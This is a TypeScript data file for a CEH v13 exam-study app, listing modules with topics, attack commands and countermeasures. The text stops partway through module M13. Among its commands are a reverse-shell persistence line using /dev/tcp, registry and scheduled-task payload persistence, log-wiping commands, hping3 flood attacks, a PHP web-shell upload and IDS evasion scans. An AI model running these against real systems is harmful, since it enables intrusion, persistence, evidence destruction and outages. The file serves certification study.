// Comprehensive CEH v13 Module Database

export interface Topic {
  id: string;
  title: string;
  content: string;
  keyPoints?: string[];
  commands?: { command: string; description: string }[];
}

export interface Module {
  id: string;
  number: string;
  title: string;
  description: string;
  examWeight: string;
  estimatedQuestions: number;
  duration: string;
  topics: Topic[];
  keyTools: string[];
  countermeasures: string[];
  commonPorts?: { port: number; protocol: string; service: string; description: string }[];
}

export const cehModules: Module[] = [
  {
    id: 'm01',
    number: 'M01',
    title: 'Introduction to Ethical Hacking',
    description: 'Fundamentals of information security, hacking terminology, phases, and legal frameworks.',
    examWeight: '6%',
    estimatedQuestions: 7,
    duration: '2h 15m',
    topics: [
      {
        id: 'm01-t01',
        title: 'Information Security Overview',
        content: 'Information security is the practice of protecting information by mitigating information risks. It involves protecting information systems and the information processed, stored, and transmitted by these systems from unauthorized access, use, disclosure, disruption, modification, or destruction.',
        keyPoints: [
          'CIA Triad: Confidentiality, Integrity, Availability',
          'Security controls: Administrative, Physical, Technical',
          'Defense in depth strategy',
          'Risk management process',
        ],
      },
      {
        id: 'm01-t02',
        title: 'Hacking Terminology',
        content: 'Understanding the language of cybersecurity is essential. Key terms include vulnerabilities (weaknesses), threats (potential dangers), exploits (code that takes advantage of vulnerabilities), and payloads (malicious code delivered after exploitation).',
        keyPoints: [
          'Vulnerability: A weakness in a system',
          'Threat: Potential danger to information or systems',
          'Exploit: Code or technique that takes advantage of a vulnerability',
          'Payload: Malicious code executed after successful exploitation',
          'Zero-day: Unknown vulnerability with no patch available',
        ],
      },
      {
        id: 'm01-t03',
        title: 'Hacker Classes',
        content: 'Hackers are categorized by their intent and legality of actions. White hats work legally, black hats operate illegally, while grey hats fall in between.',
        keyPoints: [
          'White Hat: Ethical hackers with authorization',
          'Black Hat: Malicious hackers operating illegally',
          'Grey Hat: Hackers without authorization but no malicious intent',
          'Script Kiddie: Unskilled hackers using existing tools',
          'Hacktivist: Hackers with political/social agendas',
          'State-sponsored: Government-backed hackers',
        ],
      },
      {
        id: 'm01-t04',
        title: 'Five Phases of Hacking',
        content: 'The systematic approach to ethical hacking follows five distinct phases: Reconnaissance, Scanning, Gaining Access, Maintaining Access, and Clearing Tracks.',
        keyPoints: [
          'Phase 1: Reconnaissance (Information Gathering)',
          'Phase 2: Scanning (Network/Port/Vulnerability)',
          'Phase 3: Gaining Access (Exploitation)',
          'Phase 4: Maintaining Access (Backdoors/Persistence)',
          'Phase 5: Clearing Tracks (Covering evidence)',
        ],
      },
      {
        id: 'm01-t05',
        title: 'Legal and Regulatory Framework',
        content: 'Ethical hacking must operate within legal boundaries. Key laws include CFAA, DMCA, and various international regulations.',
        keyPoints: [
          'Always have written authorization (Rules of Engagement)',
          'Computer Fraud and Abuse Act (CFAA)',
          'Digital Millennium Copyright Act (DMCA)',
          'GDPR for EU data protection',
          'Keep detailed logs of all activities',
        ],
      },
    ],
    keyTools: ['Nmap', 'Nessus', 'Metasploit', 'Wireshark'],
    countermeasures: [
      'Implement defense in depth strategy',
      'Regular security awareness training',
      'Establish clear security policies',
      'Maintain incident response plans',
    ],
  },
  {
    id: 'm02',
    number: 'M02',
    title: 'Footprinting and Reconnaissance',
    description: 'Master advanced OSINT techniques, passive and active reconnaissance frameworks, and deep footprinting methodologies.',
    examWeight: '8%',
    estimatedQuestions: 10,
    duration: '4h 30m',
    topics: [
      {
        id: 'm02-t01',
        title: 'Deep Footprinting Concepts & Methodology',
        content: `Footprinting is the foundational first step of any engagement. It is the systematic process of gathering exhaustive intelligence about a target before launching an attack. 

Proper footprinting builds the "Attack Surface Map"—identifying entry points, technology stacks, physical locations, human resources, and security postures. It involves two primary domains: Passive Information Gathering (where we never touch the target\'s servers directly, utilizing search engines and third-party databases) and Active Information Gathering (direct queries to the target\'s publicly facing infrastructure such as DNS servers).`,
        keyPoints: [
          'Passive Footprinting: Zero direct interaction. Leverages Google Dorks, OSINT, Shodan, and public records',
          'Active Footprinting: Direct interaction. Includes DNS zone transfers, port probing, and web crawling',
          'Information domains: Network (IPs, DNS), System (OS, services), Organization (employees, partners)',
        ],
      },
      {
        id: 'm02-t02',
        title: 'Advanced DNS Reconnaissance',
        content: `DNS is the phonebook of the internet, but it leaks a massive amount of structural data. By interrogating DNS servers using tools like dig and dnsenum, attackers can map out the entire external attack surface. We look for misconfigured zone transfers (AXFR), SPF/DMARC records for email spoofing, and obscure subdomains hosting development code.`,
        commands: [
          { command: 'whois example.com', description: 'Retrieve deeply structured domain registration info and technical contacts' },
          { command: 'dig +short example.com ANY', description: 'Query all publicly available DNS records instantly' },
          { command: 'dig axfr @ns1.example.com example.com', description: 'Attempt a full zone transfer (critical misconfiguration)' },
          { command: 'dnsenum --enum example.com', description: 'Automated comprehensive DNS brute-forcing and mapping' }
        ],
      },
      {
        id: 'm02-t03',
        title: 'Search Engine & OSINT Weaponization',
        content: `Search engines continuously index the web, invariably capturing sensitive files, error messages, and administrative panels that should be hidden. Google Dorks transform standard search engines into devastating intelligence gathering tools. Combined with specialized OSINT frameworks like theHarvester, an attacker can map human targets and corporate hierarchies.`,
        commands: [
          { command: 'theHarvester -d example.com -b all -l 500', description: 'Harvest emails, names, subdomains across all public search engines' },
          { command: 'site:example.com ext:sql OR ext:env OR ext:config', description: '[DORK] Discover exposed database dumps and environment variables' },
          { command: 'inurl:admin site:example.com', description: '[DORK] Locate hidden administrative portals' }
        ],
      },
      {
        id: 'm02-t04',
        title: 'Infrastructure & IoT Reconnaissance',
        content: `Shodan and Censys index the internet at the port and banner level. They allow attackers to discover exposed industrial control systems, webcams, default-credential routers, and legacy servers without ever sending a packet to the target themselves. Tools like Recon-ng automate the querying of these APIs to build relational intelligence graphs.`,
        commands: [
          { command: 'recon-ng', description: 'Launch the comprehensive web reconnaissance framework' },
          { command: 'shodan search "org:TargetName port:443"', description: 'Discover all indexed infrastructure tied to the organization via Shodan CLI' }
        ],
      },
    ],
    keyTools: ['theHarvester', 'Recon-ng', 'dnsenum', 'Shodan', 'Maltego'],
    countermeasures: [
      'Strict control of external DNS zone transfers (AXFR)',
      'Regular continuous OSINT monitoring of your own organization',
      'Implementing strict robots.txt for sensitive corporate endpoints',
      'Minimizing technical data leakage in HTTP headers and error pages',
    ],
  },
  {
    id: 'm03',
    number: 'M03',
    title: 'Scanning Networks',
    description: 'Advanced network scanning techniques, stealth port scanning, OS fingerprinting, and IDS/Firewall evasion.',
    examWeight: '8%',
    estimatedQuestions: 10,
    duration: '3h 45m',
    topics: [
      {
        id: 'm03-t01',
        title: 'Host Discovery & Ping Sweeps',
        content: `Before bombarding ports, attackers must determine which IP addresses are actually live. Host discovery generally uses ICMP, ARP (on local subnets), and TCP/UDP ping sweeps to map active machines without raising loud IDS alarms for full port scans. Understanding how to ping sweep covertly is crucial for mapping massive subnets rapidly.`,
        commands: [
          { command: 'nmap -sn -PE 192.168.1.0/24', description: 'Ping sweep using standard ICMP Echo Requests' },
          { command: 'nmap -PR 192.168.1.0/24', description: 'Unblockable ARP ping scan for local network discovery' },
          { command: 'masscan 10.0.0.0/8 -p80 --rate 10000', description: 'Masscan asynchronous high-speed host discovery via port 80' },
        ],
      },
      {
        id: 'm03-t02',
        title: 'Deep Port Scanning & TCP Handshake Analysis',
        content: `Port scanning involves sending specially crafted TCP, UDP, or SCTP packets and analyzing the response flags (SYN/ACK/RST) to determine if a service is listening. Understanding the 3-way TCP handshake is mandatory. The stealth SYN scan is the industry standard, bypassing primitive loggers by never completing the full TCP connection.`,
        commands: [
          { command: 'nmap -sT 192.168.1.1', description: 'TCP Connect scan (Loud, completes full 3-way handshake)' },
          { command: 'nmap -sS -p- 192.168.1.1', description: 'SYN "Stealth" scan across all 65535 ports' },
          { command: 'nmap -sU --top-ports 100 192.168.1.1', description: 'UDP scan for stateless protocols like DNS, SNMP, TFTP' },
          { command: 'nmap -sX 192.168.1.1', description: 'XMAS scan (Sets FIN, URG, and PUSH flags to bypass stateless firewalls)' },
        ],
      },
      {
        id: 'm03-t03',
        title: 'Service Profiling & OS Fingerprinting',
        content: `Discovering an open port is useless without knowing exactly what is running behind it. Attackers heavily rely on service version detection (probing the service to leak its banner and version) and OS fingerprinting (analyzing the exact structure of TCP/IP parameters like TTL and Window Size to guess the underlying kernel).`,
        commands: [
          { command: 'nmap -sV --version-intensity 9 192.168.1.1', description: 'Aggressive service version detection and banner grabbing' },
          { command: 'nmap -O --osscan-guess 192.168.1.1', description: 'Aggressive Operating System kernel fingerprinting' },
          { command: 'nmap -A -T4 192.168.1.1', description: 'Enable OS detection, version detection, script scanning, and traceroute' },
        ],
      },
      {
        id: 'm03-t04',
        title: 'IDS & Firewall Evasion',
        content: `Modern targets are protected by Intrusion Detection Systems (IDS) and stateful firewalls. To bypass them, traffic must be manipulated. This includes fragmenting packets to break signatures, using decoy IP addresses to obscure the origin, spoofing MAC/IPs, and altering packet timing to stay below threshold alerts.`,
        commands: [
          { command: 'nmap -f --mtu 24 192.168.1.1', description: 'Fragment packets into 24-byte chunks to bypass basic IDS' },
          { command: 'nmap -D RND:10 192.168.1.1', description: 'Hide the scan by generating traffic from 10 random Decoy IPs' },
          { command: 'nmap -S 192.168.1.254 -e eth0 192.168.1.1', description: 'Spoof the source IP address as the network gateway' },
          { command: 'nmap -T1 192.168.1.1', description: 'Sneaky timing profile to evade rate-based security sensors' },
        ],
      },
    ],
    keyTools: ['nmap', 'masscan', 'hping3'],
    countermeasures: [
      'Strict Zero Trust architecture with default-deny firewall policies',
      'Implement profound IDS/IPS stateful packet inspection',
      'Configuring proper egress filtering to prevent internal spoofing',
      'Deploying network honeypots to detect internal scanning early',
    ],
    commonPorts: [
      { port: 21, protocol: 'TCP', service: 'FTP', description: 'File Transfer Protocol - often allows anonymous login' },
      { port: 22, protocol: 'TCP', service: 'SSH', description: 'Secure Shell - prime target for brute force attacks' },
      { port: 23, protocol: 'TCP', service: 'Telnet', description: 'Unencrypted remote access - captures credentials in plaintext' },
      { port: 25, protocol: 'TCP', service: 'SMTP', description: 'Email routing - vulnerable to VRFY/EXPN user enumeration' },
      { port: 53, protocol: 'UDP/TCP', service: 'DNS', description: 'Domain Name System - vulnerable to zone transfers and magnification' },
      { port: 80, protocol: 'TCP', service: 'HTTP', description: 'Unencrypted Web traffic - entry point for OWASP web attacks' },
      { port: 443, protocol: 'TCP', service: 'HTTPS', description: 'Encrypted web - often hides command and control (C2) traffic' },
      { port: 445, protocol: 'TCP', service: 'SMB', description: 'Windows file sharing - infamous for EternalBlue and broad network propagation' },
      { port: 3389, protocol: 'TCP', service: 'RDP', description: 'Remote Desktop - highly sought after for initial access brokers' },
    ],
  },
  {
    id: 'm04',
    number: 'M04',
    title: 'Enumeration',
    description: 'Extract detailed information from services including users, shares, and system details.',
    examWeight: '7%',
    estimatedQuestions: 9,
    duration: '4h 00m',
    topics: [
      {
        id: 'm04-t01',
        title: 'NetBIOS Enumeration',
        content: 'NetBIOS provides valuable information about Windows networks including users, shares, and domain information.',
        commands: [
          { command: 'nmap --script=nbstat.nse 192.168.1.100', description: 'NetBIOS statistics' },
          { command: 'nbtscan 192.168.1.0/24', description: 'NetBIOS name scanner' },
          { command: 'net view /domain', description: 'List domain resources' },
        ],
      },
      {
        id: 'm04-t02',
        title: 'SNMP Enumeration',
        content: 'Simple Network Management Protocol can reveal extensive system information if community strings are weak.',
        commands: [
          { command: 'snmpwalk -v2c -c public 192.168.1.100', description: 'Walk SNMP tree' },
          { command: 'onesixtyone -c communities.txt 192.168.1.100', description: 'Brute force community strings' },
          { command: 'snmp-check 192.168.1.100', description: 'SNMP enumeration' },
        ],
      },
      {
        id: 'm04-t03',
        title: 'LDAP Enumeration',
        content: 'LDAP directory services contain user accounts, groups, and organizational information.',
        commands: [
          { command: 'ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=local"', description: 'Basic LDAP search' },
          { command: 'nmap -p 389 --script ldap-search 192.168.1.10', description: 'Nmap LDAP enumeration' },
        ],
      },
      {
        id: 'm04-t04',
        title: 'SMB Enumeration',
        content: 'Server Message Block protocol reveals shares, users, and system information on Windows networks.',
        commands: [
          { command: 'enum4linux -a 192.168.1.100', description: 'Full SMB enumeration' },
          { command: 'smbclient -L //192.168.1.100 -N', description: 'List shares' },
          { command: 'smbmap -H 192.168.1.100', description: 'SMB share enumerator' },
          { command: 'crackmapexec smb 192.168.1.100', description: 'CME SMB enumeration' },
        ],
      },
      {
        id: 'm04-t05',
        title: 'SMTP Enumeration',
        content: 'SMTP servers can reveal valid user accounts through VRFY and EXPN commands.',
        commands: [
          { command: 'nmap -p 25 --script smtp-enum-users 192.168.1.100', description: 'SMTP user enumeration' },
          { command: 'smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100', description: 'VRFY method enumeration' },
        ],
      },
      {
        id: 'm04-t06',
        title: 'DNS Enumeration',
        content: 'DNS enumeration discovers subdomains, mail servers, and other DNS records.',
        commands: [
          { command: 'dnsenum --enum example.com', description: 'DNS enumeration' },
          { command: 'fierce --domain example.com', description: 'DNS reconnaissance' },
          { command: 'dnsrecon -d example.com -t axfr', description: 'Zone transfer attempt' },
        ],
      },
    ],
    keyTools: ['enum4linux', 'snmpwalk', 'ldapsearch', 'smbmap', 'dnsenum', 'fierce'],
    countermeasures: [
      'Use strong SNMP community strings',
      'Disable unnecessary services',
      'Implement access controls on LDAP',
      'Restrict NetBIOS over TCP/IP',
      'Monitor for enumeration attempts',
    ],
  },
  {
    id: 'm05',
    number: 'M05',
    title: 'Vulnerability Analysis',
    description: 'Finding, classifying, and prioritizing security vulnerabilities.',
    examWeight: '7%',
    estimatedQuestions: 9,
    duration: '3h 30m',
    topics: [
      {
        id: 'm05-t01',
        title: 'Vulnerability Classification',
        content: 'Vulnerabilities are classified by type, severity, and impact to prioritize remediation efforts.',
        keyPoints: [
          'Software vulnerabilities: Buffer overflow, injection flaws',
          'Configuration vulnerabilities: Default passwords, unnecessary services',
          'Hardware vulnerabilities: Physical access, side-channel attacks',
          'Human vulnerabilities: Social engineering, phishing',
        ],
      },
      {
        id: 'm05-t02',
        title: 'CVSS Scoring',
        content: 'Common Vulnerability Scoring System (CVSS) provides a standardized way to rate vulnerability severity.',
        keyPoints: [
          'CVSS 3.1 Score ranges:',
          '0.0 = None',
          '0.1–3.9 = Low',
          '4.0–6.9 = Medium',
          '7.0–8.9 = High',
          '9.0–10.0 = Critical',
        ],
      },
      {
        id: 'm05-t03',
        title: 'Vulnerability Databases',
        content: 'Public databases track known vulnerabilities and provide information for remediation.',
        commands: [
          { command: 'searchsploit apache 2.4.49', description: 'Search Exploit-DB' },
        ],
        keyPoints: [
          'CVE: Common Vulnerabilities and Exposures',
          'NVD: National Vulnerability Database',
          'Exploit-DB: Exploit database',
          'Vendor security advisories',
        ],
      },
      {
        id: 'm05-t04',
        title: 'Scanning Tools',
        content: 'Automated tools identify vulnerabilities across networks and applications.',
        commands: [
          { command: 'gvm-setup && gvm-start', description: 'Start OpenVAS' },
          { command: 'nikto -h http://192.168.1.100', description: 'Web vulnerability scan' },
          { command: 'nmap --script=vuln 192.168.1.100', description: 'Nmap vulnerability scan' },
          { command: 'nmap --script=smb-vuln-ms17-010 192.168.1.100', description: 'Check for EternalBlue' },
        ],
      },
    ],
    keyTools: ['Nessus', 'OpenVAS', 'Nikto', 'Nmap NSE', 'Qualys', 'Rapid7'],
    countermeasures: [
      'Regular vulnerability scanning',
      'Patch management program',
      'Vulnerability disclosure process',
      'Risk-based prioritization',
      'Continuous monitoring',
    ],
  },
  {
    id: 'm06',
    number: 'M06',
    title: 'System Hacking',
    description: 'Password cracking, privilege escalation, maintaining access, and clearing tracks.',
    examWeight: '8%',
    estimatedQuestions: 10,
    duration: '5h 15m',
    topics: [
      {
        id: 'm06-t01',
        title: 'Password Cracking',
        content: 'Various techniques to recover passwords from hashes or through brute force.',
        commands: [
          { command: 'john hashes.txt --wordlist=rockyou.txt', description: 'John the Ripper dictionary attack' },
          { command: 'hashcat -m 1000 hashes.txt rockyou.txt', description: 'Hashcat NTLM cracking' },
          { command: 'hydra -l admin -P rockyou.txt ssh://192.168.1.100', description: 'Online brute force' },
        ],
      },
      {
        id: 'm06-t02',
        title: 'Privilege Escalation - Linux',
        content: 'Techniques to gain elevated privileges on Linux systems.',
        commands: [
          { command: 'sudo -l', description: 'List sudo privileges' },
          { command: 'find / -perm -4000 2>/dev/null', description: 'Find SUID binaries' },
          { command: 'find / -writable -type f 2>/dev/null', description: 'Find writable files' },
          { command: 'cat /etc/crontab', description: 'Check cron jobs' },
          { command: './linpeas.sh', description: 'Automated privilege escalation check' },
        ],
      },
      {
        id: 'm06-t03',
        title: 'Privilege Escalation - Windows',
        content: 'Techniques to gain elevated privileges on Windows systems.',
        commands: [
          { command: 'whoami /priv', description: 'Show current privileges' },
          { command: 'net localgroup administrators', description: 'List administrators' },
          { command: 'sc query', description: 'List services' },
          { command: '.\\winpeas.exe', description: 'Automated Windows privilege escalation' },
        ],
      },
      {
        id: 'm06-t04',
        title: 'Maintaining Access',
        content: 'Techniques to maintain persistent access to compromised systems.',
        commands: [
          { command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v malware /t REG_SZ /d "C:\\payload.exe"', description: 'Registry persistence' },
          { command: 'schtasks /create /tn "Updater" /tr "C:\\payload.exe" /sc ONLOGON', description: 'Scheduled task persistence' },
          { command: 'echo "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1" >> /etc/rc.local', description: 'Linux rc.local persistence' },
        ],
      },
      {
        id: 'm06-t05',
        title: 'Clearing Tracks',
        content: 'Techniques used by attackers to cover their tracks and evade detection.',
        commands: [
          { command: 'history -c && history -w', description: 'Clear bash history' },
          { command: 'wevtutil cl System', description: 'Clear Windows System log' },
          { command: 'wevtutil cl Security', description: 'Clear Windows Security log' },
        ],
        keyPoints: [
          'Linux: Clear bash history, syslog, auth.log',
          'Windows: Clear Event Logs',
          'Timestomping: Modify file timestamps',
          'Log manipulation: Delete or modify log entries',
        ],
      },
    ],
    keyTools: ['John', 'Hashcat', 'Hydra', 'Mimikatz', 'LinPEAS', 'WinPEAS'],
    countermeasures: [
      'Strong password policies',
      'Multi-factor authentication',
      'Regular privilege audits',
      'EDR and SIEM monitoring',
      'Immutable logging',
    ],
  },
  {
    id: 'm07',
    number: 'M07',
    title: 'Malware Threats',
    description: 'Types of malware, analysis techniques, and APT attack lifecycle.',
    examWeight: '6%',
    estimatedQuestions: 7,
    duration: '3h 45m',
    topics: [
      {
        id: 'm07-t01',
        title: 'Malware Types',
        content: 'Understanding different types of malware and their characteristics.',
        keyPoints: [
          'Virus: Self-replicates by attaching to files',
          'Worm: Self-propagates across networks',
          'Trojan: Disguised as legitimate software',
          'Ransomware: Encrypts files for ransom',
          'Rootkit: Hides presence with privileged access',
          'Spyware: Secretly monitors user activity',
          'Keylogger: Records keystrokes',
          'Botnet: Network of compromised devices',
        ],
      },
      {
        id: 'm07-t02',
        title: 'APT Attack Lifecycle',
        content: 'Advanced Persistent Threats follow a structured attack lifecycle.',
        keyPoints: [
          '1. Initial Compromise (spear phishing, watering hole)',
          '2. Establish Foothold (backdoor, RAT)',
          '3. Escalate Privileges',
          '4. Internal Reconnaissance',
          '5. Lateral Movement',
          '6. Data Exfiltration',
          '7. Maintain Presence',
        ],
      },
      {
        id: 'm07-t03',
        title: 'Malware Analysis',
        content: 'Techniques for analyzing malware behavior and characteristics.',
        commands: [
          { command: 'strings malware.exe', description: 'Extract printable strings' },
          { command: 'file malware.exe', description: 'Identify file type' },
          { command: 'md5sum malware.exe', description: 'Calculate MD5 hash' },
          { command: 'sha256sum malware.exe', description: 'Calculate SHA256 hash' },
        ],
        keyPoints: [
          'Static Analysis: Examine without execution',
          'Dynamic Analysis: Observe behavior in sandbox',
          'Code Analysis: Reverse engineer the code',
        ],
      },
    ],
    keyTools: ['VirusTotal', 'Any.run', 'Cuckoo Sandbox', 'Ghidra', 'IDA Pro'],
    countermeasures: [
      'Antivirus and EDR solutions',
      'Application whitelisting',
      'User awareness training',
      'Network segmentation',
      'Regular backups (for ransomware)',
    ],
  },
  {
    id: 'm08',
    number: 'M08',
    title: 'Sniffing',
    description: 'Network traffic capture, analysis, and active sniffing attacks.',
    examWeight: '5%',
    estimatedQuestions: 6,
    duration: '3h 00m',
    topics: [
      {
        id: 'm08-t01',
        title: 'Sniffing Concepts',
        content: 'Sniffing captures and analyzes network traffic for information gathering.',
        keyPoints: [
          'Passive Sniffing: Monitor without injection (hub environment)',
          'Active Sniffing: Inject traffic (switched environment)',
          'Promiscuous Mode: Accept all packets',
          'Monitor Mode: Capture wireless traffic',
        ],
      },
      {
        id: 'm08-t02',
        title: 'Protocols Vulnerable to Sniffing',
        content: 'Unencrypted protocols transmit data in plaintext, making them vulnerable.',
        keyPoints: [
          'HTTP (port 80)',
          'FTP (port 21)',
          'Telnet (port 23)',
          'SMTP (port 25)',
          'POP3 (port 110)',
          'IMAP (port 143)',
          'SNMP v1/v2 (port 161)',
        ],
      },
      {
        id: 'm08-t03',
        title: 'ARP Spoofing',
        content: 'ARP poisoning redirects traffic through the attacker\'s machine.',
        commands: [
          { command: 'echo 1 > /proc/sys/net/ipv4/ip_forward', description: 'Enable IP forwarding' },
          { command: 'arpspoof -i eth0 -t 192.168.1.100 192.168.1.1', description: 'ARP spoof victim to gateway' },
          { command: 'ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//', description: 'Ettercap ARP spoofing' },
        ],
      },
      {
        id: 'm08-t04',
        title: 'Wireshark Filters',
        content: 'Display filters help focus on specific traffic of interest.',
        commands: [
          { command: 'http.request.method == "POST"', description: 'Show HTTP POST requests' },
          { command: 'ftp contains "PASS"', description: 'Show FTP passwords' },
          { command: 'tcp.port == 80', description: 'Filter by TCP port' },
          { command: 'ip.src == 192.168.1.100', description: 'Filter by source IP' },
        ],
      },
    ],
    keyTools: ['Wireshark', 'tcpdump', 'Ettercap', 'Bettercap', 'TCPFlow'],
    countermeasures: [
      'Use encrypted protocols (HTTPS, SFTP, SSH)',
      'Implement Dynamic ARP Inspection (DAI)',
      'Enable DHCP snooping',
      'Configure port security',
      'Use 802.1X authentication',
    ],
  },
  {
    id: 'm09',
    number: 'M09',
    title: 'Social Engineering',
    description: 'Human manipulation techniques and social engineering attack vectors.',
    examWeight: '5%',
    estimatedQuestions: 6,
    duration: '3h 30m',
    topics: [
      {
        id: 'm09-t01',
        title: 'Social Engineering Types',
        content: 'Various techniques exploit human psychology to gain unauthorized access.',
        keyPoints: [
          'Phishing: Mass email attacks',
          'Spear Phishing: Targeted email attacks',
          'Whaling: Targeting executives',
          'Vishing: Voice phishing (phone calls)',
          'Smishing: SMS phishing',
          'Pretexting: Creating false scenarios',
          'Baiting: Offering something enticing',
          'Tailgating: Physical access following',
          'Quid Pro Quo: Exchange of information',
        ],
      },
      {
        id: 'm09-t02',
        title: 'Psychology Principles',
        content: 'Social engineers exploit fundamental human psychological principles.',
        keyPoints: [
          'Reciprocity: Feeling obligated to return favors',
          'Commitment: Desire to be consistent',
          'Social Proof: Following others\' behavior',
          'Authority: Obeying authority figures',
          'Liking: Trusting people we like',
          'Scarcity: Fear of missing out',
        ],
      },
      {
        id: 'm09-t03',
        title: 'Phishing Tools',
        content: 'Tools for creating and managing phishing campaigns.',
        commands: [
          { command: 'setoolkit', description: 'Launch Social-Engineer Toolkit' },
          { command: './gophish', description: 'Start Gophish framework' },
        ],
      },
    ],
    keyTools: ['SET', 'Gophish', 'King Phisher', 'Evilginx2', 'GoPhish'],
    countermeasures: [
      'Security awareness training',
      'Email filtering and SPF/DKIM/DMARC',
      'Verify unusual requests',
      'Implement MFA',
      'Create reporting procedures',
    ],
  },
  {
    id: 'm10',
    number: 'M10',
    title: 'Denial of Service',
    description: 'DoS/DDoS attack types, tools, and mitigation strategies.',
    examWeight: '4%',
    estimatedQuestions: 5,
    duration: '2h 45m',
    topics: [
      {
        id: 'm10-t01',
        title: 'DoS Attack Types',
        content: 'Various techniques overwhelm target systems to deny service to legitimate users.',
        keyPoints: [
          'SYN Flood: Half-open connections',
          'ICMP Flood: Ping flood',
          'UDP Flood: Random port flooding',
          'HTTP Flood: Application-layer attacks',
          'Slowloris: Slow HTTP requests',
          'Smurf: Amplified ICMP broadcast',
          'DNS Amplification: Small query, large response',
          'NTP Amplification: monlist abuse',
        ],
      },
      {
        id: 'm10-t02',
        title: 'DDoS Botnets',
        content: 'Distributed attacks use compromised devices (botnets) to amplify attacks.',
        keyPoints: [
          'Mirai: IoT device botnet',
          'Emotet: Banking trojan/botnet',
          'VPNFilter: Router botnet',
          'Recruitment via malware infections',
          'Command and Control (C2) infrastructure',
        ],
      },
      {
        id: 'm10-t03',
        title: 'Attack Tools',
        content: 'Tools for stress testing and DDoS attack simulation.',
        commands: [
          { command: 'hping3 -S --flood -V -p 80 192.168.1.100', description: 'SYN flood attack' },
          { command: 'hping3 --udp -p 53 --flood 192.168.1.100', description: 'UDP flood attack' },
          { command: 'slowloris 192.168.1.100 -port 80', description: 'Slowloris attack' },
        ],
      },
    ],
    keyTools: ['HPing3', 'LOIC', 'Slowloris', 'Apache Bench', 'Siege'],
    countermeasures: [
      'Rate limiting',
      'SYN cookies',
      'DDoS mitigation services (Cloudflare, Akamai)',
      'Load balancers',
      'Traffic filtering and blackholing',
    ],
  },
  {
    id: 'm11',
    number: 'M11',
    title: 'Session Hijacking',
    description: 'Session token theft, prediction, and hijacking techniques.',
    examWeight: '4%',
    estimatedQuestions: 5,
    duration: '2h 30m',
    topics: [
      {
        id: 'm11-t01',
        title: 'Session Hijacking Types',
        content: 'Different methods to take over user sessions.',
        keyPoints: [
          'Active Hijacking: Taking over active session',
          'Passive Hijacking: Monitoring without interference',
          'Network-level: TCP session hijacking',
          'Application-level: Cookie/session token theft',
        ],
      },
      {
        id: 'm11-t02',
        title: 'Session Token Attacks',
        content: 'Techniques to obtain or predict session tokens.',
        keyPoints: [
          'Session sniffing: Capture tokens in transit',
          'Predictable tokens: Guess session IDs',
          'Session fixation: Force known session ID',
          'Cross-Site Scripting (XSS): Steal cookies',
          'Malware: Extract browser cookies',
        ],
      },
      {
        id: 'm11-t03',
        title: 'Countermeasures',
        content: 'Protections against session hijacking attacks.',
        keyPoints: [
          'HTTPS everywhere with HSTS',
          'Secure and HttpOnly cookie flags',
          'Session timeout and regeneration',
          'SameSite cookie attribute',
          'CSRF tokens for sensitive operations',
          'IP binding for sessions',
        ],
      },
    ],
    keyTools: ['Bettercap', 'Hamster/Ferret', 'Cookie Cadger', 'Wireshark'],
    countermeasures: [
      'Use HTTPS with HSTS',
      'Implement secure cookie flags',
      'Short session timeouts',
      'Regenerate session IDs after login',
      'Use CSRF protection',
    ],
  },
  {
    id: 'm12',
    number: 'M12',
    title: 'Evading IDS, Firewalls & Honeypots',
    description: 'Techniques to bypass security controls and detect honeypots.',
    examWeight: '5%',
    estimatedQuestions: 6,
    duration: '3h 00m',
    topics: [
      {
        id: 'm12-t01',
        title: 'IDS/IPS Types',
        content: 'Intrusion Detection and Prevention Systems monitor for malicious activity.',
        keyPoints: [
          'NIDS: Network-based (Snort, Suricata)',
          'HIDS: Host-based (OSSEC, Wazuh)',
          'Signature-based: Known attack patterns',
          'Anomaly-based: Behavioral deviations',
          'Stateful Protocol Analysis',
        ],
      },
      {
        id: 'm12-t02',
        title: 'IDS Evasion Techniques',
        content: 'Methods to avoid detection by IDS/IPS systems.',
        commands: [
          { command: 'nmap -f 192.168.1.1', description: 'Fragment packets' },
          { command: 'nmap -D RND:5,ME 192.168.1.1', description: 'Use decoys' },
          { command: 'nmap --source-port 53 192.168.1.1', description: 'Spoof source port' },
          { command: 'nmap -T0 --scan-delay 5s 192.168.1.1', description: 'Slow timing' },
        ],
      },
      {
        id: 'm12-t03',
        title: 'Firewall Types',
        content: 'Different firewall technologies provide varying levels of protection.',
        keyPoints: [
          'Packet Filtering: Stateless, checks headers',
          'Stateful Inspection: Tracks connection state',
          'Application-layer: Deep packet inspection',
          'Next-Gen Firewall: IPS + App awareness',
          'Web Application Firewall (WAF)',
        ],
      },
      {
        id: 'm12-t04',
        title: 'Honeypots',
        content: 'Decoy systems designed to attract and detect attackers.',
        keyPoints: [
          'Low-interaction: Simulated services',
          'High-interaction: Real OS/software',
          'Research vs Production honeypots',
          'Honeynet: Network of honeypots',
        ],
      },
    ],
    keyTools: ['Snort', 'Suricata', 'OSSEC', 'Honeyd', 'Dionaea'],
    countermeasures: [
      'Defense in depth',
      'Regular rule updates',
      'Proper placement of sensors',
      'Log correlation and analysis',
      'Honeypot integration',
    ],
  },
  {
    id: 'm13',
    number: 'M13',
    title: 'Hacking Web Servers',
    description: 'Web server attacks, misconfigurations, and hardening techniques.',
    examWeight: '5%',
    estimatedQuestions: 6,
    duration: '3h 15m',
    topics: [
      {
        id: 'm13-t01',
        title: 'Web Server Attacks',
        content: 'Various attacks target web server software and configurations.',
        keyPoints: [
          'Directory Traversal: ../../../etc/passwd',
          'HTTP Response Splitting',
          'Web Cache Poisoning',
          'SSRF (Server-Side Request Forgery)',
          'Buffer Overflow in web server',
          'Misconfiguration exploitation',
        ],
      },
      {
        id: 'm13-t02',
        title: 'Banner Grabbing',
        content: 'Identifying web server software and versions.',
        commands: [
          { command: 'curl -I http://target.com', description: 'Get HTTP headers' },
          { command: 'nmap -sV -p 80,443 target.com', description: 'Version detection' },
          { command: 'nikto -h http://target.com', description: 'Web server scan' },
        ],
      },
      {
        id: 'm13-t03',
        title: 'HTTP Methods',
        content: 'Testing for dangerous HTTP methods.',
        commands: [
          { command: 'curl -X OPTIONS http://target.com/', description: 'Check allowed methods' },
          { command: 'curl -X PUT http://target.com/shell.php -d "<?php system($_GET[\'cmd\'])?>"', description: 'Test PUT method' },
